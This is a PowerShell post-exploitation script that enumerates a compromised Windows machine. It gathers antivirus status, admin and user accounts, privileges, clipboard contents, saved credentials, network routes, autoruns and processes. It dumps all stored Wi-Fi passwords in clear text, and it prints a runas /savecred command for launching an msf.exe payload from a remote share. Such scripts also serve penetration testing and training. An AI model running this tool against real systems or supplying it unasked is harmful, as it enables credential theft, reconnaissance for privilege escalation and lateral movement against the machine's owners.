<#
.NAME
    Get-InitialEnum


.SYNOPSIS
    This cmdlet was created to perform enumeration of a Windows system using PowerShell.


.DESCRIPTION
    This cmdlet enumerates a system that has been compromised to better understand what is running on the target.
    This does not test for any PrivEsc methods it only enumerates machine info. Use Test-PrivEsc to search for possible exploits.


.SYNTAX
    Get-InitialEnum [[-FilePath] <string>] [<CommonParameters>]


.PARAMETERS
    -FilePath <string>

        Required?                    false
        Position?                    0
        Accept pipeline input?       false
        Parameter set name           ByPath
        Aliases                      None
        Dynamic?                     false

    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).


INPUTS
    System.Management.Automation.PSObject


OUTPUTS
    System.Object


.ALIASES
    None


.NOTES
    Author: Rob Osborne
    Alias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthosborne.com/
#>
Function Get-InitialEnum {
    [CmdletBinding()]
        param()  # End param

    BEGIN
    {
    Function Get-Driver {
        [CmdletBinding()]
            Param (
                [Switch]$Unsigned,
                [Switch]$Signed,
                [Switch]$All)  # End param
    BEGIN
    {

        Write-Host "Retrieving driver signing information …" -ForegroundColor "Cyan"

    } # End of Begin section
    PROCESS
    {

        If ($Signed)
        {

            Write-Verbose "Obtaining signed driver info..."
            $DrvSig = DriverQuery -SI | Select-String -Pattern "True"

            $DrvSig
            "`n " + $DrvSig.count + " signed drivers, note TRUE column"

        }  # End of If
        ElseIf ($UnSigned)
        {

            Write-Verbose "Obtaining signed driver info..."
            $DrvU = DriverQuery -SI | Select-String "False"

            $DrvU
            "`n " + $DrvU.count + " unsigned drivers, note FALSE column"

        }  # End ElseIf
        ElseIf ($All)
        {

            DriverQuery -SI

        }  # End ElseIf
        Else
        {

            DriverQuery

        }  # End Else

    } # End PROCESS

    } # End Function Get-Driver


    Function Get-AntiVirusProduct {
        [CmdletBinding()]
            param (
                [Parameter(
                    Mandatory=$False,
                    Position=0,
                    ValueFromPipeline=$True,
                    ValueFromPipelineByPropertyName=$true)]
        [Alias('Computer')]
        [string]$ComputerName=$env:COMPUTERNAME )  # End param

        $AntiVirusProducts = Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct"  -ComputerName $ComputerName

        $Ret = @()
        ForEach ($AntiVirusProduct in $AntiVirusProducts)
        {
           #The values are retrieved from: http://community.kaseya.com/resources/m/knowexch/1020.aspx
            Switch ($AntiVirusProduct.productState)
            {
                "262144" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
                "262160" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
                "266240" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
                "266256" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
                "393216" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
                "393232" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
                "393488" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
                "397312" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
                "397328" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
                "397584" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}

                Default {$defstatus = "Unknown" ;$rtstatus = "Unknown"}
            }  # End Switch

            $HashTable = @{}
            $HashTable.Computername = $ComputerName
            $HashTable.Name = $AntiVirusProduct.DisplayName
            $HashTable.'Product GUID' = $AntiVirusProduct.InstanceGuid
            $HashTable.'Product Executable' = $AntiVirusProduct.PathToSignedProductExe
            $HashTable.'Reporting Exe' = $AntiVirusProduct.PathToSignedReportingExe
            $HashTable.'Definition Status' = $DefStatus
            $HashTable.'Real-time Protection Status' = $RtStatus

            $Ret += New-Object -TypeName "PSObject" -Property $HashTable

        }  # End ForEach

        $Ret

    }  # End Function Get-AntiVirusProduct

}  # End BEGIN
PROCESS
{
#================================================================
#  SECURITY PATCHES
#================================================================
    Write-Host "=================================`n| OPERATING SYSTEM INFORMATION |`n=================================" -ForegroundColor "Yellow"
    Get-CimInstance -ClassName "Win32_OperatingSystem" | Select-Object -Property Name,Caption,Description,CSName,Version,BuildNumber,OSArchitecture,SerialNumber,RegisteredUser

    Write-Host "=================================`n| HOTFIXES INSTALLED ON DEVICE |`n=================================" -ForegroundColor "Yellow"
    Try
    {

        Get-Hotfix -Description "Security Update"

    }  # End Try
    Catch
    {

        Get-CimInstance -Query 'SELECT * FROM Win32_QuickFixEngineering' | Select-Object -Property HotFixID

    }  # End Catch

#===================================================================
#  NETWORK SHARES AND DRIVES
#===================================================================
Write-Host "=================================`n|  NEWORK SHARE DRIVES  |`n=================================" -ForegroundColor "Yellow"
Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSystem" } | Format-Table -AutoSize


#===================================================================
#  FIND UNSIGNED DRIVERS
#===================================================================

    Get-Driver -Unsigned

#==========================================================================
#  ANTIVIRUS APPLICATION INFORMATION
#==========================================================================
    Write-Host "=================================`n|    ANTI-VIRUS INFORMATION    |`n=================================" -ForegroundColor "Yellow"

    Get-AntiVirusProduct

#==========================================================================
#  USER, USER PRIVILEDGES, AND GROUP INFO
#==========================================================================
    Write-Host "=================================`n|  LOCAL ADMIN GROUP MEMBERS  |`n=================================" -ForegroundColor "Yellow"
    Get-LocalGroupMember -Group "Administrators" | Format-Table -Property "Name","PrincipalSource"

    Write-Host "=================================`n|       USER & GROUP LIST       |`n=================================" -ForegroundColor "Yellow"
    Get-CimInstance -ClassName "Win32_UserAccount" | Format-Table -AutoSize
    Get-LocalGroup | Format-Table -Property "Name"

    Write-Host "=================================`n|  CURRENT USER PRIVS   |`n=================================" -ForegroundColor "Yellow"
    whoami /priv

    Write-Host "=================================`n| USERS WHO HAVE HOME DIRS |`n=================================" -ForegroundColor "Yellow"
    Get-ChildItem -Path C:\Users | Select-Object -Property "Name"

    Write-Host "=================================`n|  CLIPBOARD CONTENTS  |`n=================================" -ForegroundColor "Yellow"
    Get-Clipboard

    Write-Host "=================================`n|  SAVED CREDENTIALS  |`n=================================" -ForegroundColor "Yellow"
    cmdkey /list
    Write-Host "If you find a saved credential it can be used issuing a command in the below format: "
    Write-Host 'runas /savecred /user:WORKGROUP\Administrator "\\###.###.###.###\FileShare\msf.exe"'

    Write-Host "=================================`n|  SIGNED IN USERS  |`n=================================" -ForegroundColor "Yellow"
    qwinsta

#==========================================================================
#  NETWORK INFORMATION
#==========================================================================
    Write-Host "=================================`n|   LISTENING PORTS   |`n=================================" -ForegroundColor "Yellow"
    Get-NetTcpConnection -State "Listen" | Sort-Object -Property "LocalPort" | Format-Table -AutoSize

    Write-Host "=================================`n|  ESTABLISHED CONNECTIONS  |`n=================================" -ForegroundColor "Yellow"
    Get-NetTcpConnection -State "Established" | Sort-Object -Property "LocalPort" | Format-Table -AutoSize

    Write-Host "=================================`n|  DNS SERVERS  |`n=================================" -ForegroundColor "Yellow"
    Get-DnsClientServerAddress -AddressFamily "IPv4" | Select-Object -Property "InterfaceAlias","ServerAddresses" | Format-Table -AutoSize

    Write-Host "=================================`n|  ROUTING TABLE  |`n=================================" -ForegroundColor "Yellow"
    Get-NetRoute | Select-Object -Property "DestinationPrefix","NextHop","RouteMetric" | Format-Table -AutoSize

    Write-Host "=================================`n|    ARP NEIGHBOR TABLE    |`n=================================" -ForegroundColor "Yellow"
    Get-NetNeighbor | Select-Object -Property "IPAddress","LinkLayerAddress","State" | Format-Table -AutoSize

    Write-Host "=================================`n|  Wi-Fi Passwords  |`n=================================" -ForegroundColor "Yellow"
    (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

#==========================================================================
#  APPLICATION INFO
#==========================================================================
    Write-Host "=================================`n| INSTALLED APPLICATIONS |`n=================================" -ForegroundColor "Yellow"

    $Paths = 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\'

    ForEach ($Path in $Paths)
    {

        Get-ChildItem -Path $Path | Get-ItemProperty | Select-Object -Property "DisplayName","Publisher","InstallDate","DisplayVersion" | Format-Table -AutoSize

    }  # End ForEach

    Write-Host "=================================`n| STARTUP APPLICATIONS |`n=================================" -ForegroundColor "Yellow"
    Get-CimInstance -ClassName "Win32_StartupCommand" | Select-Object -Property "Name","Command","Location","User" | Format-Table -AutoSize

    $StartupAppCurrentUser = (Get-ChildItem -Path "C:\Users\$env:USERNAME\Start Menu\Programs\Startup" | Select-Object -ExpandProperty "Name" | Out-String).Trim()
    If ($StartupAppCurrentUser)
    {

        Write-Host "$StartupAppCurrentUser automatically starts for $env:USERNAME" -ForegroundColor "Cyan"

    }  # End If

    $StartupAppAllUsers = (Get-ChildItem -Path "C:\Users\All Users\Start Menu\Programs\Startup" | Select-Object -ExpandProperty "Name" | Out-String).Trim()
    If ($StartupAppAllUsers)
    {

        Write-Host "$StartupAppAllUsers automatically starts for All Users" -ForegroundColor "Cyan"

    }  # End If

    Write-Host "Check below values for binaries you may be able to execute as another user."
    Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
    Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
    Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
    Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'


#==========================================================================
#  PROCESS AND SERVICE ENUMERATION
#==========================================================================
    Write-Host "=================================`n|  PROCESS ENUMERATION  |`n=================================" -ForegroundColor "Yellow"
    Get-WmiObject -Query "Select * from Win32_Process" | Where-Object { $_.Name -notlike "svchost*" } | Select-Object -Property "Name","Handle",@{Label="Owner";Expression={$_.GetOwner().User}} | Format-Table -AutoSize

    Write-Host "=================================`n|  ENVIRONMENT VARIABLES  |`n=================================" -ForegroundColor "Yellow"
    Get-ChildItem -Path "Env:" | Format-Table -Property "Key","Value"

}  # End PROCESS

}  # End Function Get-InitialEnum
